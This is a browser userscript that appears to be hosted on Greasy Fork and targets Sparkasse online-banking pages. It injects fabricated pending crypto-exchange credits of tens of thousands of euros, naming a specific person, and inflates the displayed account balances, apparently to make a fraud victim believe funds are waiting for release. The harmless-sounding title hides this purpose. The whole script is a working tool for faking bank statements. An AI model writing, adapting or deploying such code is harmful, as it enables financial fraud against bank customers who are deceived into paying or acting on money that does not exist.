// ==UserScript==
// @name         Vertragssignature Georg Baier
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  try to take over the world!
// @author       You
// @match        https://www.sparkasse-loerrach.de/de/home/onlinebanking/umsaetze/umsaetze.html*
// @match        https://www.sparkasse-loerrach.de/de/home/onlinebanking/finanzstatus.html*
// @match        https://www.taunussparkasse.de/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/452457/Vertragssignature%20Georg%20Baier.user.js
// @updateURL https://update.greasyfork.org/scripts/452457/Vertragssignature%20Georg%20Baier.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...

    //Tabelle 2 = Vorgemerkt, wenn das Verfügbar ist!! Wenn nicht ist das der Umsatz
    // Tabelle 3 = Echter Umsatz, wenn er bereits vorgemerkte hat!!
    // Tabelle 4 = Echter Umsatz, keine Vorgemerktetn verfügbar
    var tabelle = 4;
    var vorgemerkt = "yes";
    var kontoteil = "1";
    var absender = "Payward Ltd.";
    var asenderReference = "WD3746 TRX322567.00 Georg Baier - Crypto.com";
    var absenderDetails = "30.08.2022 | GUTSCHR. TREUHAND";

    var done = 0;

    function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");}
    var editk = "88000";
    var editk2 = numberWithCommas(editk);

    if (window.location.href.indexOf("umsaetze") > 0) {

        var elementExists = document.getElementsByClassName("btableblock ")[0];

            setInterval(function() { elementExists = document.getElementsByClassName("btableblock ")[0];
        if (elementExists != null){
            if (done == 0){
        var xHTML = '<table role="table" aria-label="Gebuchte Umsätze" aria-describedby="umsatz" class="btable pfm-umsatz no-2nd-row top-align hover-over-area actionicon-noborder toggle-table-row toggle-table-group spacious with-logo"><caption class="offscreen" id="umsatz">Die Tabelle zeigt Ihnen die Umsätze des gewählten Kontos bzw. Depots im gewählten Zeitraum.</caption><tbody><tr class="tableheader noborder" id="aria01664377839718-0" role="heading" aria-level="2"><td class="nowrap" id="aria01664377839718-0-td">Spezialauftrag (1)</td><td class="right nowrap" colspan="3"><div class="data"><div class="datatable"><div class="label">Aufgelistete Aufträge benötigen eine Freigabe<em>***</em></div></div></div></td></tr><tr class="tableroweven toggle-table-row-open hoverable" id="aria01664377839718-0-0" role="region" aria-labelledby="aria01664377839718-0-td" aria-level="3" aria-expanded="true" aria-controls="aria01664377839718-0-td4 "><td class="left"><div class="payment"><div class="image"></div><span class="title">Payward Ltd.</span><span class="subtitle">WD3746 TRX88538.00 Baier, Goerg - Crypto.com</span><span class="details">SEPA-Überweisung mit Bankgarantie - Freigabe nötig durch Gegenpartei</span></div></td><td class="nowrap"><div class="bcategory">&nbsp;</div></td><td class="right"><div class="balance"><span aria-hidden="true" class="balance-predecimal plus">88.538</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-1.000,00 EUR</span></div></td><td id="aria01664377839718-0-td4"><div class=""><div class="ficon icon-if5_symbol_banking_6"><input onclick="return IF.checkFirstSubmit();" class="" role="link" data-tracked="true" title="Freigabe nötig" value="Freigabe nötig" name="" type="button"></div></div></td></tr><tr id="aria01664377839718-0-0" role="region" aria-labelledby="aria01664377839718-0-td" aria-level="3" aria-expanded="true" aria-controls="aria01664377839718-0-td4 " class="tablerowodd toggle-table-row-open hoverable"><td class="left"><div class="payment"><div class="image"></div><span class="title">Payward Ltd.</span><span class="subtitle">WD3903 TRX153988.00 Baier, Goerg - Crypto.com</span><span class="details">SEPA-Überweisung mit Bankgarantie - Freigabe nötig durch Gegenpartei</span></div></td><td class="nowrap"><div class="bcategory">&nbsp;</div></td><td class="right"><div class="balance"><span aria-hidden="true" class="balance-predecimal plus">153.988</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">-1.000,00 EUR</span></div></td><td id="aria01664377839718-0-td4"><div class=""><div class="ficon icon-if5_symbol_banking_6"><input onclick="return IF.checkFirstSubmit();" class="" role="link" data-tracked="true" title="Freigabe nötig" value="Freigabe nötig" name="" type="button"></div></div></td></tr></tbody></table>';
        var saveHTML = document.getElementsByClassName("btableblock ")[0].innerHTML;
        document.getElementsByClassName("btableblock ")[0].innerHTML = xHTML + saveHTML;
        done = 1;}}}, 500);
    }

    //Umsätze
    //Gesamtsaldo
    if (window.location.href.indexOf("finanzstatus") > 0) {
        if (vorgemerkt == "no"){
    var gesamtnoedit = document.getElementsByTagName("tbody")[1].lastChild.previousSibling.children[1].children[0].children[1].textContent;
    var newSaldo = parseFloat(editk) + parseFloat(gesamtnoedit.replace(".", ""));
    var newSaldoDec = numberWithCommas(newSaldo);
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.children[1].children[0].children[1].textContent = newSaldoDec;
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.children[1].children[0].children[1].className = 'balance-predecimal plus';
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.children[1].children[0].children[2].className = 'balance-decimal plus';
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.previousElementSibling.children[1].children[0].children[1].textContent = newSaldoDec;
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.previousElementSibling.children[1].children[0].children[1].className = 'balance-predecimal plus';
    document.getElementsByTagName("tbody")[1].lastChild.previousSibling.previousElementSibling.children[1].children[0].children[2].className = 'balance-decimal plus';

    //Balance Updater
    //Receive Balance
    var balanceAcc =document.getElementsByTagName("tbody")[1].children[kontoteil].children[1].children[0].children[0].textContent;
    var newBalance = parseFloat(editk) + parseFloat(balanceAcc.replace(".", ""));
    var newBalanceDec = numberWithCommas(newBalance);
    //Update Balance
    document.getElementsByTagName("tbody")[1].children[kontoteil].children[1].children[0].children[0].textContent = newBalanceDec;
    document.getElementsByTagName("tbody")[1].children[kontoteil].children[1].children[0].children[0].className = 'balance-predecimal plus';
    document.getElementsByTagName("tbody")[1].children[kontoteil].children[1].children[0].children[1].className = 'balance-decimal plus';
    document.getElementsByTagName("tbody")[1].children[kontoteil].children[1].children[0].children[0].style.marginLeft = "-46px"

        }

    }
})();